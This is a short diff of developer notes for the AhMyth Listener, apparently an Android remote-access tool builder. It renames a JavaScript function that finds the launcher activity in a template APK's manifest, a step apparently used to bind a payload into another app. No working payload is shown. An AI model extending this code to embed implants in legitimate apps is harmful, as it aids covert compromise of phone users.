@@ -167,7 +167,7 @@ Stop function for the AhMyth Listener | index.html = Line 69 |
 code utilising `unix "find"` command to find the correct launcher activity | AppCtrl.js | FINALLY FUCKING WORKS!!!!!
 need to implement ShellJS for cross-platform operation of this function now
 ```javascript
-            var launcherActivity = GetLauncherPath(data, apkFolder);
+            var launcherActivity = GetLauncherActivity(data, apkFolder);
             if (launcherActivity == -1) {
                 $appCtrl.Log("Cannot find the launcher activity in the Manifest!", CONSTANTS.logStatus.FAIL);
                 $appCtrl.Log("Please Template Another APK.", CONSTANTS.logStatus.INFO);
@@ -247,7 +247,7 @@ need to implement ShellJS for cross-platform operation of this function now
 new GetLauncherPath function for the new launcher location funtion
 ```js
 //function to extract the launcher activity from the orginal app
-function GetLauncherPath(manifest) {
+function GetLauncherActivity(manifest) {
 
 
     var regex = /<activity/gi,
